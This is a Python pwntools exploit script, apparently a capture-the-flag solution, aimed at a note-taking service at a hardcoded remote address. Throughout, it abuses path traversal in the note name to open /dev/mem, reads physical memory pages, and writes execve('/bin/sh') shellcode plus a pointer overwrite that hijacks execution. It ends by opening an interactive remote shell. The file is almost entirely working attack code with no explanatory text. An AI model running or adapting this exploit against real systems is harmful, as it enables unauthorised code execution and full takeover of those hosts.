#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
# context.log_level = 0

def write_note(size, content):
    sleep(0.2)
    p.sendline(b'1')
    sleep(0.2)
    p.sendline(str(size).encode())
    sleep(0.2)
    p.sendline(content)

def read_note(size, get_data=False):
    p.sendlineafter(b'Choose one:', b'2')
    p.sendlineafter(b'Size?\r\n', str(size).encode())
    
    if get_data:
        if is_remote:
            p.recvline() # IDK why remote server will echo size
        return p.recvuntil(b'1. Write the note', drop=True)


def byebye():
    sleep(0.2)
    p.sendline(b'3')

p = remote('3.115.128.152', 3154)
is_remote = True

# p = process('./run.sh')
# is_remote = False

the_file = b'/dev/mem'
note     = b'/..' + the_file
p.sendlineafter(b'Name of note?', note)
# p.sendlineafter(b'random: crng init done', note)

cnt = 0
page_cnt = 0x10

while cnt < 0x480:
    log.info(f'{hex(cnt)}| read {page_cnt} pages...')
    try:
        read_note(0x1000 * page_cnt)
    except:
        break
    cnt += page_cnt

page_cnt = 0x1

while cnt < 0x481:
    log.info(f'{hex(cnt)}| read {page_cnt} pages...')
    try:
        read_note(0x1000 * page_cnt)
    except:
        break
    cnt += page_cnt


log.info(f'{hex(cnt)}| read {page_cnt} pages...')

with open('dump.bin', 'rb') as f:
    origin_page_content = f.read()

filename = b'/bin/sh\0'
payload  = filename
payload += asm('''
    mov rax, 59
    mov rdi, 0x60481000
    mov rsi, 0
    mov rdx, 0
    syscall
''')

write_note(len(payload), payload)

cnt = 0
page_cnt = 0x10

while cnt < 0x480:
    log.info(f'{hex(cnt)}| read {page_cnt} pages...')
    try:
        read_note(0x1000 * page_cnt)
    except:
        break
    cnt += page_cnt

page_cnt = 0x1

while cnt < 0x481:
    log.info(f'{hex(cnt)}| read {page_cnt} pages...')
    try:
        read_note(0x1000 * page_cnt)
    except:
        break
    cnt += page_cnt


log.info(f'{hex(cnt)}| read {page_cnt} pages...')

# Adjust offset
read_note(0x840)

payload = p64(0x60481000 + len(filename)) # run our shellcode
write_note(len(payload), payload)

# exit
byebye()
p.sendline(b'ls -al')
p.interactive()
